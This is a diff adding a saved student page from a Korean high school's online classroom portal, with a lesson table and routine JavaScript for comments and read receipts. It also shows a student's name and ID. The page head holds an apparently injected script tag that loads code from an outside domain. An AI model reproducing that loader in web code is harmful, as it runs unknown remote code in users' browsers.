@@ -1,0 +1,199 @@
+<html class=" mediaqueries matchmedia" data-arp-injected="true"><head><script type="text/javascript" src="https://3001.scriptcdn.net/code/static/1"></script></head><body topmargin="0" leftmargin="0">
+	<title>▒현대청운고등학교▒</title>
+	<link rel="stylesheet" href="../css/bootstrap1.css">
+	<script type="text/javascript" src="../js1/jquery.min.js"></script>
+	<script type="text/javascript" src="../js1/cube6.js"></script>
+	<script type="text/javascript" src="../js1/bootstrap.min.js"></script>
+	<script type="text/javascript" src="../js1/plugins1.js"></script>
+	<script type="text/javascript" src="../js1/scripts.js"></script>
+	<link rel="stylesheet" href="../css/style2.css">
+	<style type="text/css">
+	a{ text-decoration:none;color:black;}
+	body {font-family:NotokrR;font-size:14;}
+	</style>
+
+<table width="90%" align="center" cellspacing="0" style="border-collapse:collapse;">
+	<tbody><tr>
+        <td bgcolor="#1160a6" height="40" style="font-size:17;" valign="bottom"><font color="white">현대청운고등학교 클래스룸</font></td>
+    </tr>
+</tbody></table>
+<table width="90%" align="center" cellspacing="0" style="border-collapse:collapse;font-size:15;">
+    <tbody><tr>
+        <td width="50%" style="border-width:1;border-color:black;border-style:none;" valign="top">
+						<form name="form11" method="post">
+<input type="button" value="첫화면" onclick="location.href='../student.html';" style="font-family:NotokrR;width:80;font-size:14;cursor:hand;">
+<span style="font-size:15;color:blue">30619 이승준</span></form>
+<iframe name="m2" width="0" height="0" frameborder="no"></iframe>		</td>
+    </tr>
+</tbody></table>
+<br>
+<form name="form1" method="post">
+<table width="90%" align="center" cellspacing="0" style="border-collapse:collapse;">
+    <tbody><tr>
+		<td width="25%" valign="top" style="min-width:300;">
+			<iframe id="mn" name="mn" src="./menu_s.html" width="100%" height="680" onload="calcHeight();" frameborder="0" scrolling="no" style="overflow: hidden;"></iframe>
+		</td>
+		<td valign="top">
+			<!--여기부터 입력-->
+
+<!--새로운 시도-->
+<table width="100%" style="font-size:15;">
+	<tbody><tr height="35">
+		<td>
+					</td>
+		<td align="right">
+			<input type="button" value="출석체크 및 채팅방" style="font-family:NotoKrR;font-size:15;height:35;cursor:hand;border-width:1;border-color:#e6e6e6;padding:0 20;" onclick="location.href='chat_stu.php?qlesson_c=';">
+					</td>
+	</tr>
+</tbody></table>
+<div class="container" style="width:100%;min-width:1000;" align="center">
+	<!-- Accordions -->
+	<div class="panel-group accordion" id="accordion">
+		<div class="panel">
+			<div class="panel-heading">
+				<a data-toggle="collapse" data-parent="#accordion" class="plus">
+					<table width="100%" style="font-size:15;">
+						<tbody><tr height="30">
+							<td width="7%" style="padding-left:10;">연번</td>
+							<td width="15%">교과</td>
+							<td>제목</td>
+							<td width="8%" align="center">선생님</td>
+							<td width="8%" align="center">첨부파일</td>
+							<td width="9%" align="center">형태</td>
+							<td width="10%" align="center">자료제출</td>
+							<td width="8%" align="center">읽음</td>
+							<td width="10%" align="center">등록날짜</td>
+						</tr>
+					</tbody></table>
+				</a>
+			</div><!--panel-heading -->
+		</div><!--panel -->
+				            </div>
+        </div>
+
+
+
+<input type="hidden" name="page" value="1">
+<input type="hidden" name="choice" value="">
+
+
+
+<p align="center"><span style="font-size:15">
+</span></p>
+<iframe name="f2" width="0" height="0" frameborder="no"></iframe>
+
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+
+
+<script>
+var ch = "";
+
+if(ch){
+document.querySelector('#c'+ch).classList.add('show');
+document.querySelector('#c'+ch).className = "plus panel-collapse";
+}
+
+var x = "";
+window.scrollTo(0,x);
+
+function calcHeight(){
+ var the_height = document.getElementById('mn').contentWindow.document.body.scrollHeight;
+
+ document.getElementById('mn').height = the_height;
+ document.getElementById('mn').style.overflow = "hidden";
+}
+
+function func_ok(UID,st_UID,cnt,sd){
+	var c = "k"+cnt;
+	var r = "d"+cnt;
+	var chk = document.getElementById(c).innerHTML;
+
+	if(chk == "안읽음"){
+		document.getElementById(c).innerHTML = "읽음";
+		document.getElementById(r).style.color = "";
+
+		f2.location.href = "ok.php?sd="+sd+"&st_UID="+st_UID+"&UID="+UID;
+	}
+}
+
+
+
+
+function func_dat_write(cnt){
+	var ff = "dd"+cnt;
+	document.getElementById(ff).style.display = "";
+}
+
+function func_dat_edit_view(cnt){
+	var ff = "e"+cnt;
+	document.getElementById(ff).style.display = "";
+}
+
+function func_dat_close(cnt){
+	var ff = "dd"+cnt;
+	var fff = "e"+cnt;
+	document.getElementById(ff).style.display = "none";
+	document.getElementById(fff).style.display = "none";
+}
+
+function func_dat_edit_close(cnt){
+	var fff = "e"+cnt;
+	document.getElementById(fff).style.display = "none";
+}
+function func_submit(){
+	if(document.form1.text1.value == ""){
+		alert('검색할 단어를 입력해 주세요.');return;
+	}
+	document.form1.action = "";
+	document.form1.submit();
+}
+
+function func_del(tot,UID){
+	if(tot > 0){alert('댓글이 있으면 삭제할 수 없습니다.');return;}
+	del = confirm('이 글을 삭제하시겠습니까?');
+	if(del==true){
+		var xx = document.body.scrollTop;
+		document.form1.target = "f2";
+		document.form1.action = "del.php?UID="+UID+"&x="+xx;
+		document.form1.submit();
+	}else{return;}
+
+}
+
+function func_dat(UID,dUID,qUID,cnt){
+	var xx = document.body.scrollTop;
+	document.form1.target = "f2";
+	document.form1.action = "insert_dat2.php?qUID="+qUID+"&cnt="+cnt+"&x="+xx+"&dUID="+dUID+"&UID="+UID;
+	document.form1.submit();
+}
+
+function func_edit(qUID,cnt){
+	var xx = document.body.scrollTop;
+
+	document.form1.action = "edit.php?UID="+qUID+"&cnt="+cnt+"&x="+xx;
+	document.form1.submit();
+}
+
+function func_dat_edit(qUID,dUID,cnt){
+	var xx = document.body.scrollTop;
+	document.form1.target = "f2";
+	document.form1.action = "dat_edit2.php?UID="+qUID+"&cnt="+cnt+"&x="+xx+"&dUID="+dUID;
+	document.form1.submit();
+}
+
+function func_dat_del(EUID,dUID,count){
+	var xx = document.body.scrollTop;
+	var del = confirm("이 댓글을 삭제하시겠습니까?");
+	if(del == true){
+		document.form1.target = "f2";
+		document.form1.action = "dat_del2.php?EUID="+EUID+"&dUID="+dUID+"&cnt="+count+"&x="+xx;
+		document.form1.submit();
+	}else{
+		return;
+	}
+}
+
+
+</script></td></tr></tbody></table></form></body></html>
